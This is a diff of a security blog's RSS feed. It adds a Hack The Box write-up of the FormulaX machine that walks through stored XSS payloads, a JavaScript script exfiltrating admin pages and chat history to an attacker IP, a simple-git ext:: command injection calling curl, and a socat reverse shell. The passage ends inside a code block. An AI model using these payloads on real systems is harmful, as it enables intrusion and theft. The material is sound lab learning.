@@ -1,4 +1,680 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[null]]></title><description><![CDATA[null]]></description><link>inesmartins.github.io/</link><image><url>inesmartins.github.io/favicon.png</url><title>null</title><link>inesmartins.github.io/</link></image><generator>Ghost 4.7</generator><lastBuildDate>Wed, 13 Nov 2024 13:21:59 GMT</lastBuildDate><atom:link href="inesmartins.github.io/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[Exploiting SSRF in Kubernetes]]></title><description><![CDATA[<p>While testing an API that was exposed to the Internet, I found an unauthorised SSRF vulnerability that allowed me to trick the server into performing any <code>GET</code> request using <code>http</code> or <code>https</code> protocol.</p><p>I had access to the response (i.e.: this wasn&apos;t a blind SSRF), full control</p>]]></description><link>inesmartins.github.io/exploiting-ssrf-in-k8s-environment/</link><guid isPermaLink="false">660ac0a92ac6400bb040b8bf</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Mon, 01 Apr 2024 17:30:11 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2024/04/6.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2024/04/6.png" alt="Exploiting SSRF in Kubernetes"><p>While testing an API that was exposed to the Internet, I found an unauthorised SSRF vulnerability that allowed me to trick the server into performing any <code>GET</code> request using <code>http</code> or <code>https</code> protocol.</p><p>I had access to the response (i.e.: this wasn&apos;t a blind SSRF), full control of the URI, but, as expected, could not control the request headers. Also, there was no rate limit.</p><p>While writing my report I explained how this vulnerability could be abused to bypass security controls, enumerate internal hosts and services, and even perform DoS attacks on third parties or internal services.</p><p>However, I wanted to go one step further.</p><p>I knew the containerised application ran on a GKE cluster, so I wanted to see how much of the internal <code>k8s</code> configuration I could exfiltrate.</p><p>After coming across <a href="https://www.assetnote.io/resources/research/cloudflare-pages-part-3-the-return-of-the-secrets">this post</a> I found that the <a href="https://www.deepnetwork.com/blog/2020/01/13/kubelet-api.html">Kubelet API</a> allows you to retrieve information about each pod running on the host by calling the following endpoint:</p><pre><code>http://&lt;host_ip&gt;:10255/pods</code></pre><p>As described in <a href="https://www.deepnetwork.com/blog/2020/01/13/kubelet-api.html">the documentation</a>:</p><blockquote>The information is very detailed and includes the metadata, labels, annotations, owner references (for example the DaemonSet that owns the pod), volumes, containers, and status.</blockquote><p>The response was a gold mine.</p><p>Note that I was also able to trigger unauthorised requests that relate to metrics, but the results were not as relevant:</p><pre><code>http://&lt;host_ip&gt;:10255/metrics
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[null]]></title><description><![CDATA[null]]></description><link>inesmartins.github.io/</link><image><url>inesmartins.github.io/favicon.png</url><title>null</title><link>inesmartins.github.io/</link></image><generator>Ghost 4.7</generator><lastBuildDate>Wed, 13 Nov 2024 13:31:37 GMT</lastBuildDate><atom:link href="inesmartins.github.io/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[HTB Write-up | FormulaX (user-only)]]></title><description><![CDATA[<p>Retired machine can be found <a href="https://www.hackthebox.com/machines/FormulaX">here</a>.</p><hr><p>Let&apos;s start with some basic enumeration:</p><pre><code class="language-bash">~ nmap -F 10.10.11.6
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre><p>There&apos;s a web application running on port <code>80</code>:</p><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-11.23.59.png" class="kg-image" alt loading="lazy" width="1438" height="721" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-01-at-11.23.59.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-01-at-11.23.59.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-11.23.59.png 1438w" sizes="(min-width: 1200px) 1200px"><figcaption>http://10.10.11.6/static/index.html</figcaption></figure><p>The</p>]]></description><link>inesmartins.github.io/htb-writeup-formulax/</link><guid isPermaLink="false">65fdb5b25c3d904d3825d752</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Wed, 13 Nov 2024 13:31:33 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2024/08/FormulaX-1.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2024/08/FormulaX-1.png" alt="HTB Write-up | FormulaX (user-only)"><p>Retired machine can be found <a href="https://www.hackthebox.com/machines/FormulaX">here</a>.</p><hr><p>Let&apos;s start with some basic enumeration:</p><pre><code class="language-bash">~ nmap -F 10.10.11.6
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre><p>There&apos;s a web application running on port <code>80</code>:</p><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-11.23.59.png" class="kg-image" alt="HTB Write-up | FormulaX (user-only)" loading="lazy" width="1438" height="721" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-01-at-11.23.59.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-01-at-11.23.59.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-11.23.59.png 1438w" sizes="(min-width: 1200px) 1200px"><figcaption>http://10.10.11.6/static/index.html</figcaption></figure><p>The source code discloses a couple authenticated routes, which may be useful in the future:</p><figure class="kg-card kg-code-card"><pre><code class="language-html">if (response.data.Status == &quot;success&quot;) {
+	//redirect to the home page
+	localStorage.setItem(&quot;logged_in&quot;, &quot;true&quot;);
+	window.location.href = `/restricted/home.html`;
+} else if (response.data.Status == &quot;admin&quot;) {
+	localStorage.setItem(&quot;logged_in&quot;, &quot;admin&quot;);
+	window.location.href = `/admin/admin.html`;
+}
+</code></pre><figcaption>http://10.10.11.6/static/index.html</figcaption></figure><p>We can register a new account:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-11.24.19.png" class="kg-image" alt="HTB Write-up | FormulaX (user-only)" loading="lazy" width="1438" height="715" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-01-at-11.24.19.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-01-at-11.24.19.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-11.24.19.png 1438w" sizes="(min-width: 720px) 720px"><figcaption>http://10.10.11.6/static/register.html</figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-11.24.50.png" class="kg-image" alt="HTB Write-up | FormulaX (user-only)" loading="lazy" width="1433" height="719" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-01-at-11.24.50.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-01-at-11.24.50.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-11.24.50.png 1433w" sizes="(min-width: 720px) 720px"><figcaption>http://10.10.11.6/restricted/home.html</figcaption></figure><h2 id="interacting-with-the-chatbot">Interacting with the Chatbot</h2><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-12.35.08.png" class="kg-image" alt="HTB Write-up | FormulaX (user-only)" loading="lazy" width="998" height="262" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-01-at-12.35.08.png 600w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-12.35.08.png 998w"><figcaption>http://10.10.11.6/restricted/chat.html</figcaption></figure><p>The chatbot is very limited. According to the output of the <code>help</code> command we should only be able to execute the <code>history</code> command and &quot;ask random questions&quot;:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-11.25.45.png" class="kg-image" alt="HTB Write-up | FormulaX (user-only)" loading="lazy" width="765" height="227" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-01-at-11.25.45.png 600w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-11.25.45.png 765w" sizes="(min-width: 720px) 720px"><figcaption>http://10.10.11.6/restricted/chat.html</figcaption></figure><p>It looks like the <code>history</code> command only displays the commands previously sent by our user: </p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-11.26.16.png" class="kg-image" alt="HTB Write-up | FormulaX (user-only)" loading="lazy" width="778" height="436" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-01-at-11.26.16.png 600w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-11.26.16.png 778w" sizes="(min-width: 720px) 720px"><figcaption>http://10.10.11.6/restricted/chat.html</figcaption></figure><p>Under the hood, here is how this chatbot seems to work:</p><h3 id="step-1html-page-and-resources-are-loaded">Step 1 - HTML page and resources are loaded</h3><p>The <code>/restricted/chat.html</code> page loads the following scripts:</p><pre><code class="language-html">&lt;script src=&quot;/scripts/axios.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;/socket.io/socket.io.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./chat.js&quot;&gt;&lt;/script&gt;</code></pre><p>Both the <a href="https://axios-http.com/docs/intro">Axios</a> and the <a href="https://socket.io/">Socket.IO</a> scripts are common libraries: the first is used to manage http requests while the second helps with socket connections.</p><p>The <code>chat.js</code> script contains the &quot;custom&quot; logic for this page.</p><h3 id="step-2api-endpoint-is-requested">Step 2 - API endpoint is requested</h3><p>As shown below, <code>chat.js</code> starts by sending a GET request to <code>/user/api/chat</code>:</p><pre><code>let value;
+const res = axios.get(`/user/api/chat`);
+...</code></pre><p>This request simply returns a <code>200</code> and the text <code>Chat Room</code>, so at this point I&apos;m not exactly sure how it&apos;s being used:</p><pre><code>GET /user/api/chat HTTP/1.1
+Host: 10.10.11.6
+...
+Cookie: authorization=Bearer%20eyJ...</code></pre><pre><code>HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Thu, 01 Aug 2024 10:46:16 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 9
+Connection: keep-alive
+X-Powered-By: Express
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+ETag: W/&quot;9-p4gNjrNhAjU5JKDfjagWi07JjzQ&quot;
+
+Chat Room</code></pre><h3 id="step-3socket-connection-is-established">Step 3 - Socket connection is established</h3><p>Next, <code>chat.js</code> establishes the socket connection using <a href="https://socket.io/docs/v4/client-api/#iourl">the <code>io</code> function</a>: </p><pre><code class="language-js">let value;
+const socket = io(&apos;/&apos;,{withCredentials: true});</code></pre><p>The <a href="https://socket.io/docs/v4/client-options/#withcredentials"><code>withCredentials</code> option</a> works as follows:</p><blockquote>Whether the cross-site requests should be sent including credentials such as cookies, authorization headers or TLS client certificates. Setting <code>withCredentials</code> has no effect on same-site requests.</blockquote><h3 id="step-4incoming-messages-are-displayed-on-the-page">Step 4 - Incoming messages are displayed on the page</h3><p>Next, the <code>chat.js</code> script makes sure to display any incoming messages from the server, by setting the <code>innerHTML</code> value of a new <code>div</code> element, <u>which is prone to XSS when there is no sanitisation</u>:</p><pre><code class="language-javascript">//listening for the messages
+socket.on(&apos;message&apos;, (my_message) =&gt; {
+  //console.log(&quot;Received From Server: &quot; + my_message)
+  Show_messages_on_screen_of_Server(my_message)
+})
+
+// [...]
+
+const Show_messages_on_screen_of_Server = (value) =&gt; {
+  const div = document.createElement(&apos;div&apos;);
+  div.classList.add(&apos;container&apos;)
+  div.innerHTML = `  
+  &lt;h2&gt;&amp;#129302;  &lt;/h2&gt;
+    &lt;p&gt;${value}&lt;/p&gt;
+  `
+  document.getElementById(&apos;big_container&apos;).appendChild(div)
+}</code></pre><h3 id="step-5messages-typed-by-the-user-are-sent-to-the-server-and-sanitised">Step 5 - Messages typed by the user are sent to the server and sanitised</h3><p>The messages typed by the user are sent to the server and then, to prevent XSS, they&apos;re sanitised with the custom <code>htmlEncode</code> function before being displayed on the screen (also by setting the <code>innerHTML</code> property of a new <code>div</code> element):</p><pre><code class="language-javascript">const typing_chat = () =&gt; {
+  value = document.getElementById(&apos;user_message&apos;).value
+  if (value) {
+    // sending the  messages to the server
+    socket.emit(&apos;client_message&apos;, value)
+    Show_messages_on_screen_of_Client(value);
+    // here we will do out socket things..
+    document.getElementById(&apos;user_message&apos;).value = &quot;&quot;
+  }
+  else {
+    alert(&quot;Cannot send Empty Messages&quot;);
+  }
+}
+
+function htmlEncode(str) {
+  return String(str).replace(/[^\w. ]/gi, function (c) {
+    return &apos;&amp;#&apos; + c.charCodeAt(0) + &apos;;&apos;;
+  });
+}
+
+// send the input to the chat forum
+const Show_messages_on_screen_of_Client = (value) =&gt; {
+  value = htmlEncode(value)
+  const div = document.createElement(&apos;div&apos;);
+  div.classList.add(&apos;container&apos;)
+  div.classList.add(&apos;darker&apos;)
+  div.innerHTML = `  
+  &lt;h2&gt;&amp;#129302;  &lt;/h2&gt;
+      &lt;p&gt;${value}&lt;/p&gt;
+  `
+  document.getElementById(&apos;big_container&apos;).appendChild(div)
+}</code></pre><p><u>Custom sanitisation functions are notably prone to error and bypasses, so this is also a good place to start</u>.</p><h2 id="trying-to-achieve-xss-on-the-chatbot">Trying to achieve XSS on the Chatbot</h2><p>This was a bit of a red-herring. </p><p>Since we have access to the <code>history</code> command, I thought the obvious way to go was to send some sort of payload that would be encoded server-side in a way that could be abused to achieve XSS (since server messages are directly embedded in the DOM) but this was not easily achieved.</p><p>Also, bypassing the client-side encoding (aka the <code>htmlEncode</code> function) proved to be more tricky than expected.</p><p>So, I needed to change my approach.</p><h2 id="exploring-the-contact-form">Exploring the Contact Form</h2><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-06-21-at-19.05.13.png" class="kg-image" alt="HTB Write-up | FormulaX (user-only)" loading="lazy" width="1149" height="760" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-06-21-at-19.05.13.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-06-21-at-19.05.13.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-06-21-at-19.05.13.png 1149w"><figcaption>http://10.10.11.6/restricted/contact_us.html</figcaption></figure><p>The contact form has 3 fields which seem to be vulnerable to some sort of persistent <code>XSS</code> which is being triggered by some other user, since the elements are being correctly sanitized before being loaded into our Contact Form page:</p><pre><code>POST /user/api/contact_us HTTP/1.1
+Host: 10.10.11.6
+...
+Cookie: authorization=Bearer%20eyJ...
+
+{
+    &quot;first_name&quot;:&quot;&lt;img src=&apos;http://10.10.14.69?src=img&apos;&gt;&quot;,
+    &quot;last_name&quot;:&quot;&lt;script src=&apos;http://10.10.14.69?src=script&apos;&gt;&lt;/script&gt;&quot;,
+    &quot;message&quot;:&quot;&lt;iframe src=&apos;http://10.10.14.69?src=iframe&apos;&gt;&lt;/iframe&gt;&quot;
+}</code></pre><p>Since only the <code>img</code> and <code>iframe</code> elements trigger the callback, we can also assume that <code>script</code> tags are being filtered somehow:</p><pre><code class="language-bash">~ python3 -m http.server 80
+Serving HTTP on :: port 80 (http://[::]:80/) ...
+::ffff:10.10.11.6 - - [01/Aug/2024 12:19:08] &quot;GET /?src=iframe HTTP/1.1&quot; 200 -
+::ffff:10.10.11.6 - - [01/Aug/2024 12:19:08] &quot;GET /?src=img HTTP/1.1&quot; 200 -</code></pre><p>After some tweaking we get the following working XSS payload:</p><pre><code class="language-html">POST /sendMessage HTTP/1.1
+Host: capiclean.htb
+User-Agent: python-requests/2.32.3
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 217
+
+service=%3Cimg%20src%3Dx%20onerror%3D%22var%20script1%3Ddocument.createElement%28%27script%27%29%3Bscript1.src%3D%27http%3A//10.10.14.69%3A80/exfil_current_page.js%27%3Bdocument.head.appendChild%28script1%29%3B%22/%3E</code></pre><h2 id="using-the-stored-xss-to-exfiltrate-the-chat-messages">Using the Stored XSS to exfiltrate the Chat Messages</h2><p>Usually with XSS we try to exfiltrate authorisation tokens, but we know that the <code>authorization</code> cookie is defined with the <code>HttpOnly</code> directive set to <code>true</code>, which means it&apos;s not accessible by JavaScript.</p><p>So, let&apos;s start by understanding where this XSS vulnerability is actually being triggered by requesting the current page:</p><pre><code class="language-javascript">(function () {
+    const attackers_ip = &apos;10.10.14.69&apos;;
+    const flask_api_port = &apos;9000&apos;;
+    var exfil_data = function(data) {
+        encoded_data = encodeURIComponent(data);
+        fetch(
+            `http://${attackers_ip}:${flask_api_port}/api/exfil?encoding=base64`,
+            {
+                method: &apos;POST&apos;,
+                headers: { &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot; },
+                body: &quot;data=&quot; + encoded_data
+            }
+        );
+    }
+    var attack = function() {
+        try {
+            fetch(window.location.href, { credentials: &quot;include&quot; })
+            .then(response =&gt; response.text())
+            .then(data =&gt; {
+                exfil_data(btoa(window.location.href))
+                exfil_data(btoa(data))
+                var el = document.createElement(&apos;html&apos;);
+                el.innerHTML = data
+                all_scripts = el.getElementsByTagName(&apos;script&apos;);
+                for (var i = 0; i &lt; all_scripts.length; i++) {
+                    exfil_data(btoa(all_scripts[i].src))
+                    fetch(all_scripts[i].src, { credentials: &quot;include&quot; })
+                    .then(response =&gt; response.text())
+                    .then(page_content =&gt; exfil_data(btoa(page_content)));
+                }
+            })
+            .catch(error =&gt; fetch(`http://${attackers_ip}?debug=${error.message}`))
+        } catch(error) {
+            fetch(`http://${attackers_ip}?debug=${error.message}`)
+        }
+    }
+    attack();
+}());
+</code></pre><p>As you can see above, the page content is being exfiltrated to a local endpoint, which is being handled by a simple Flask API:</p><pre><code class="language-python">import json
+from flask import Flask, request
+from flask_cors import CORS
+from urllib.parse import unquote
+import base64
+
+app = Flask(__name__)
+CORS(app)
+
+@app.route(&apos;/api/exfil&apos;, methods=[&apos;POST&apos;])
+def exfil():
+    print(&quot;[+] Received data &quot;)
+    encoding = request.args.get(&apos;encoding&apos;)
+    data = request.form.get(&apos;data&apos;)
+    try:
+        decoded_data = unquote(unquote(data))
+        if encoding is not None and encoding == &apos;base64&apos;:
+            print(base64.b64decode(decoded_data))
+        else:
+            print(decoded_data)
+    except Exception as exception:
+        print(f&apos;Something went wrong: {exception}&apos;)
+        return json.dumps({&apos;success&apos;:False}), 500, {&apos;ContentType&apos;:&apos;application/json&apos;}
+    return json.dumps({&apos;success&apos;:True}), 200, {&apos;ContentType&apos;:&apos;application/json&apos;}
+
+app.run(host=&apos;0.0.0.0&apos;, port=9000)
+</code></pre><p>It looks like the current page is <a href="http://chatbot.htb/admin/admin.html">http://chatbot.htb/admin/admin.html</a>:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-12.50.16-1.png" class="kg-image" alt="HTB Write-up | FormulaX (user-only)" loading="lazy" width="309" height="198"><figcaption>admin.html</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-javascript">const get_messages = () =&gt; {
+    const value = document.getElementById(&quot;search&quot;).value
+    axios.get(`/user/api/get_messages`).then((response) =&gt; {
+        try {
+            response.data.Message.forEach((message =&gt; {
+                console.log(message.firstname)
+                const div = document.createElement(&quot;div&quot;);
+                div.classList.add(&quot;new_container&quot;)
+                div.innerHTML = `
+&lt;div&gt;&lt;label style=&quot;color: red;&quot; id=&quot;firstname&quot;&gt;${message.firstname} &lt;/label&gt;&lt;/div&gt;
+&lt;div&gt;&lt;label style=&quot;color: red;&quot; id=&quot;lastname&quot;&gt; ${message.lastname}&lt;/label&gt;&lt;/div&gt;
+&lt;div&gt;&lt;label style=&quot;color: red;&quot; id=&quot;message&quot;&gt; ${message.message}&lt;/label&gt;&lt;/div&gt;
+                `
+              document.getElementById(&quot;big_container&quot;).appendChild(div)
+            }))
+        } catch (err) {
+            document.getElementById(&quot;error&quot;).innerHTML = response.data.Status
+        }
+    }
+}</code></pre><figcaption>admin.js</figcaption></figure><p>It seems like the <code>/user/api/get_messages</code> request is responsible for fetching all of the messages submitted via the contact form and embedding them directly into the DOM, which is why we have the XSS.</p><p>Let&apos;s see if there are any other interesting messages:</p><pre><code class="language-javascript">(function () {
+    const attackers_ip = &apos;10.10.14.69&apos;;
+    const flask_api_port = &apos;9000&apos;;
+    var exfil_data = function(data) {
+        // ...
+    }
+    var attack = function() {
+        try {
+            fetch(`/user/api/get_messages`, { credentials: &quot;include&quot; })
+            .then(response =&gt; response.text())
+            .then(data =&gt; exfil_data(btoa(data)))
+            .catch(error =&gt; fetch(`http://${attackers_ip}?debug=${error.message}`))
+        } catch(error) {
+            fetch(`http://${attackers_ip}?debug=${error.message}`)
+        }
+    }
+    attack();
+}());
+</code></pre><p>Only our previous message shows up.</p><p>Let&apos;s see if this user has any interesting chat messages in their history by importing the <a href="Socket.IO">Socket.io</a> script to this Admin page, establishing a new socket connection, sending the <code>history</code> command, and then exfiltrating any messages to our Flask API:</p><pre><code class="language-javascript">(function () {
+	// [...]
+    var attack = function() {
+        const script = document.createElement(&apos;script&apos;);
+        script.src = &apos;/socket.io/socket.io.js&apos;;
+        document.head.appendChild(script);
+        script.addEventListener(&apos;load&apos;, function() {
+            const res = axios.get(`/user/api/chat`);
+            const socket = io(&apos;/&apos;, { withCredentials: true });
+            socket.on(&apos;message&apos;, (my_message) =&gt; exfil_data(btoa(my_message)));
+            socket.emit(&apos;client_message&apos;, &apos;history&apos;);
+        });
+    }
+    attack();
+}());
+</code></pre><p>The result is the following:</p><pre><code class="language-html">Greetings!. How can i help you today ?. You can type help to see some buildin commands
+
+Hello, I am Admin.Testing the Chat Application
+
+Write a script for  dev-git-auto-update.chatbot.htb to work properly
+
+Write a script to automate the auto-update
+
+Message Sent:&lt;br&gt;history</code></pre><p>Let&#x2019;s map out the new domains:</p><pre><code class="language-html">sudo nano /etc/hosts
+
+# htb
+10.10.11.6 chatbot.htb
+10.10.11.6 dev-git-auto-update.chatbot.htb
+</code></pre><h2 id="exploring-the-git-auto-report-generator">Exploring the Git Auto Report Generator</h2><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-14.21.19.png" class="kg-image" alt="HTB Write-up | FormulaX (user-only)" loading="lazy" width="1433" height="834" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-01-at-14.21.19.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-01-at-14.21.19.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-14.21.19.png 1433w" sizes="(min-width: 1200px) 1200px"><figcaption>http://dev-git-auto-update.chatbot.htb/</figcaption></figure><p>We can see that this feature was built using <code>simple-git v3.14</code>.</p><p>The <a href="https://www.npmjs.com/package/simple-git">simple-git</a> NPM package is &quot;a lightweight interface for running <code>git</code> commands in any <a href="https://nodejs.org/" rel="nofollow">node.js</a> application.&quot;</p><p>We can see in the source code of the <code>index.js</code> script that any value we enter in the input box is sent via POST request to the <code>clone</code> endpoint and the response is again embedded into the DOM directly, without sanitization.</p><pre><code>const handleRequest = () =&gt; {
+    document.getElementById(&apos;error&apos;).innerHTML = &quot;Loading...&quot;;
+    // Get the element
+    const value = document.getElementById(&apos;giturl&apos;).value
+    console.log(value)
+    // Send the post request
+    fetch(&apos;/clone&apos;, {
+        method: &apos;POST&apos;,
+        headers: {
+            &apos;Content-Type&apos;: &apos;application/json&apos;
+        },
+        body: JSON.stringify({
+            destinationUrl: value
+        })
+    })
+        .then(response =&gt; { return response.json() }).then(response =&gt; {
+            if (response.response != &apos;Error: Failed to Clone&apos;)
+                document.getElementById(&apos;error&apos;).innerHTML = `&lt;a href=&quot;${(response.response)}&quot; download&gt;Download File&lt;/a&gt;`
+            else
+                document.getElementById(&apos;error&apos;).innerHTML = response.response
+
+        })
+        .catch(err =&gt; {
+            document.getElementById(&apos;error&apos;).innerHTML = err
+        })
+        
+}</code></pre><p>However, we&apos;re not interested in XSS at this point, we want to be able to execute commands directly on the machine, so we need to focus on exploiting this endpoint:</p><pre><code>POST /clone HTTP/1.1
+Host: dev-git-auto-update.chatbot.htb
+Content-Type: application/json
+
+{&quot;destinationUrl&quot;:&quot;http://10.10.14.69:9000&quot;}</code></pre><pre><code>~ python3 -m http.server 9000
+
+Serving HTTP on :: port 9000 (http://[::]:9000/) ...
+::ffff:10.10.11.6 - - [01/Aug/2024 14:29:48] code 404, message File not found
+::ffff:10.10.11.6 - - [01/Aug/2024 14:29:48] &quot;GET /info/refs?service=git-upload-pack HTTP/1.1&quot; 404 -</code></pre><p>Going through the documentation, it seems like this request is the result of a <code>git fetch</code> or a <code>git fetch-pack</code> being performed by a Git client.</p><p>Basically, it&apos;s a way for the client to ask a Git server &quot;to send objects missing from this repository, to update the named heads&quot;. In response, the server sends &quot;a UNIX formatted text file describing each ref and its known value&quot;.<br>[<a href="https://mincong.io/2018/05/04/git-and-http/">Source</a>]</p><p>However, when we try to respond with the format specified in the documentation, we still get an error:</p><pre><code class="language-python">import json
+from flask import Flask
+from flask_cors import CORS
+
+app = Flask(__name__)
+CORS(app)
+
+@app.route(&apos;/info/refs&apos;, methods=[&apos;GET&apos;])
+def handle_git_request():
+    headers = {
+        &apos;ContentType&apos;:&apos;application/x-git-upload-pack-advertisement&apos;,
+        &apos;Cache-Control&apos;: &apos;no-cache&apos;
+    }
+    response = &apos;001e# service=git-upload-pack\n&apos;
+    response += &apos;004895dcfa3633004da0049d3d0fa03f80589cbcaf31 refs/heads/maint\0multi_ack\n&apos;
+    response += &apos;0042d049f6c27a2244e12041955e262a404c7faba355 refs/heads/master\n&apos;
+    response += &apos;003c2cb58b79488a98d2721cea644875a8dd0026b115 refs/tags/v1.0\n&apos;
+    response += &apos;003fa3c2e2402b99163d1d59756e5f207ae21cccba4c refs/tags/v1.0^{}\n&apos;
+    return response, 200, headers
+
+app.run(host=&apos;0.0.0.0&apos;, port=9000)
+</code></pre><p>We know that <a href="https://security.snyk.io/package/npm/simple-git">simple-git</a> has 2 RCE vulnerabilities that affect version <code>3.14</code>, one of which (<a href="https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221">SNYK-JS-SIMPLEGIT-3112221)</a> affects the <code>clone</code> method specifically:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-15.16.57.png" class="kg-image" alt="HTB Write-up | FormulaX (user-only)" loading="lazy" width="739" height="396" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-01-at-15.16.57.png 600w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-15.16.57.png 739w" sizes="(min-width: 720px) 720px"></figure><p>The <code>clone</code> function accepts the following arguments:</p><pre><code>git.clone(repoURL, localPath, options, handlerFn);</code></pre><p>We can assume that the <code>destinationUrl</code> we&apos;re sending in the POST request is being injected in the <code>repoURL</code> field, so let&apos;s try to modify the request to ping a local port:</p><pre><code>POST /clone HTTP/1.1
+Host: dev-git-auto-update.chatbot.htb
+Content-Type: application/json
+
+{&quot;destinationUrl&quot;:&quot;ext::sh -c curl% http://10.10.14.69:9000% &gt;&amp;2&quot;}</code></pre><pre><code>python3 -m http.server 9000
+Serving HTTP on :: port 9000 (http://[::]:9000/) ...
+::ffff:10.10.11.6 - - [01/Aug/2024 16:49:49] &quot;GET / HTTP/1.1&quot; 200 -
+</code></pre><p>Great, we can send commands to the machine!</p><p>Looking further into the <a href="https://git-scm.com/docs/git-remote-ext#_examples">documentation</a> that pertains to this &quot;remote helper&quot; (basically, the feature that supports the <code>ext::</code> syntax) we can see that we can also use <code>socat</code>, so let&apos;s try to use that to get a reverse shell:</p><pre><code>POST /clone HTTP/1.1
+Host: dev-git-auto-update.chatbot.htb
+...
+
+{&quot;destinationUrl&quot;:&quot;ext::socat TCP:10.10.14.69:4444 EXEC:&apos;sh&apos;,pty,stderr,setsid,sigint,sane&quot;}</code></pre><p>... and we get a shell!</p><p>Let&apos;s upgrade it: </p><pre><code class="language-bash">$ python3 -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;</code></pre><hr><h2 id="from-foothold-to-user">From foothold to user</h2><pre><code>$ whoami
+www-data
+
+$ ls -la
+...
+dr-xr-xr-x  9 root     root     4096 Jul 28  2023 app
+dr-xr-xr-x  3 root     root     4096 Feb 20 15:50 automation
+dr-xr-xr-x  4 root     root     4096 Jul 29  2023 git-auto-update</code></pre><p>The <code>app</code> directory contains the source code for the NodeJS web application we just explored, which includes a <code>.env</code> file:</p><figure class="kg-card kg-code-card"><pre><code>PORT = 8082
+URL_DATABASE=&quot;mongodb://localhost:27017&quot;
+SECRET=ThisIsTheN0deSecret
